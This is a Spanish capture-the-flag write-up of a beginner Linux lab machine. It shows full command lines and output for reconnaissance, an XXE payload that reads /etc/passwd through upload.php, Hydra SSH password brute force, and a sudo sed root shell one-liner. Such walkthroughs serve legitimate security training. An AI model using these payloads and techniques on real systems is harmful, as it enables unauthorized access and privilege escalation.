---
Estado: Completado
Plataforma: The Hackers Labs
SO: Linux
Dificultad: Principiante
VectorInicial: XXE
ServicioInicial: HTTP
PuertoInicial: 80
Credenciales:
  - castorcin: chocolate
Usuarios:
  - castorcin
  - root
Privesc: Sudo sed
Tecnicas:
  - Directory Enumeration
  - XML External Entity
  - Local File Disclosure
  - Password Brute Force
  - SSH Access
  - Sudo Privilege Escalation
Herramientas:
  - arp-scan
  - gomap
  - gobuster
  - burp suite
  - hydra
Fecha: 2026-03-04
---
![](..\attachments/Pasted%20image%2020260304125815.png|697)

Empezaremos con un descubrimiento de *IP* dentro de la red para ver donde se encuentra nuestro objetivo.

```bash
 sudo arp-scan -I eth0 --localnet                                  

Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.11.1	52:55:0a:00:0b:01	(Unknown: locally administered)
10.0.11.2	08:00:27:67:4e:d3	(Unknown)
10.0.11.3	52:55:0a:00:0b:03	(Unknown: locally administered)
10.0.11.13	08:00:27:a7:fe:2e	(Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.949 seconds (131.35 hosts/sec). 4 responded
```

Vemos que la maquina se encuentra en la dirección **10.0.11.13** así que empecemos con la enumeración de puertos.

```bash
 settarget 10.0.11.13            
TARGET establecido: 10.0.11.13

 gomap -s $TARGET     

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 10.0.11.13 (997 ports)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u3
80      open   http            Apache 2.4.62 (Debian)

Host Exposure Summary
- 10.0.11.13 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 1.18s | hosts: 1 | open ports: 2
```

Tenemos 2 puertos abiertos:
- 22 para conexión *SSH*
- 80  para *HTTP* web

Con estos indicios empezaremos por ver que hay en la web.

A primera vista no encontramos nada, solo una web estática sobre madera, con un formulario de contacto que no funciona, al ver el código de la web mediante *CTRL+U* no encontramos nada de interés salvo un *js* que contiene una linea nada mas.

```javascript
console.log("CastorTech funcionando correctamente");
```

Vamos a realizar una enumeración de directorios a ver si encontramos algo.

```bash
 gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.11.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 5070]
uploads              (Status: 301) [Size: 310] [--> http://10.0.11.13/uploads/]
upload.php           (Status: 200) [Size: 16]
css                  (Status: 301) [Size: 306] [--> http://10.0.11.13/css/]
js                   (Status: 301) [Size: 305] [--> http://10.0.11.13/js/]
server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos varios cosas interesantes.
- Carpeta **uploads** la cual tiene *directory listing* y podemos ver que esta vacia.
- Fichero **upload.php** para la subida de archivos

Vamos a probar con **upload.php** a ver si podemos subir algo, pero nos encontramos con un mensaje.

```http
xml not provided
```

Probaremos con *Burp Suite* para interceptar las peticiones y así poder realizar peticiones con contenido *XML* y ver sus respuestas.

Empecemos con algo simple y veamos que ocurre.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<test>test</test>
```

![](..\attachments/Pasted%20image%2020260304134200.png)

El fichero `upload.php` procesa contenido XML sin deshabilitar la resolución de entidades externas.

Esto permite realizar un ataque **XML External Entity (XXE)** para acceder a archivos locales del sistema.

Vamos a explotar XXE para obtener lectura de archivos locales y ver el contenido de */etc/passwd*.

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

Parece que ha funcionado y hemos obtenido un listado de usuarios del sistema.

```http
HTTP/1.1 200 OK
Date: Wed, 04 Mar 2026 13:43:33 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 1171
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/svg+xml

<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
</root>
```

De este listado vemos un usuario que nos puede servir **castorcin** así que ahora toca mirar si encontramos la contraseña contra *SSH*.

```bash
 hydra -l castorcin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-04 13:48:06
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://10.0.11.13:22/
[22][ssh] host: 10.0.11.13   login: castorcin   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-04 13:48:32
```

Ahora con los credenciales toca explorar el servidor para ver que podemos obtener.

```bash
 ssh castorcin@$TARGET
The authenticity of host '10.0.11.13 (10.0.11.13)' can't be established.
ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.11.13' (ED25519) to the list of known hosts.
castorcin@10.0.11.13's password: 
Linux TheHackersLabs-Castor 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  6 18:43:45 2026 from 192.168.18.192
castorcin@TheHackersLabs-Castor:~$ ls
user.txt
castorcin@TheHackersLabs-Castor:~$ 
```

Ahora queda la fase de escalado de privilegios, a ver que encontramos.

```bash
castorcin@TheHackersLabs-Castor:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Castor: Nombre o servicio desconocido
Matching Defaults entries for castorcin on TheHackersLabs-Castor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User castorcin may run the following commands on TheHackersLabs-Castor:
    (ALL : ALL) NOPASSWD: /usr/bin/sed
castorcin@TheHackersLabs-Castor:~$ find / -perm -4000 2>/dev/null 
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
castorcin@TheHackersLabs-Castor:~$ 
```

Parece que tenemos una opción de escalada mediante **sed** y en la web de [GtfoBins](https://gtfobins.org/gtfobins/sed/) tenemos algo que podemos aprovechar.

```bash
castorcin@TheHackersLabs-Castor:~$ sudo -u root sed -n '1e exec /bin/sh -p 1>&0' /etc/hosts
sudo: unable to resolve host TheHackersLabs-Castor: Nombre o servicio desconocido
# whoami
root
# ls /root
congrats.txt  root.txt
```

Y con esto hemos conseguido acceder como **root** al sistema y comprometerlo.



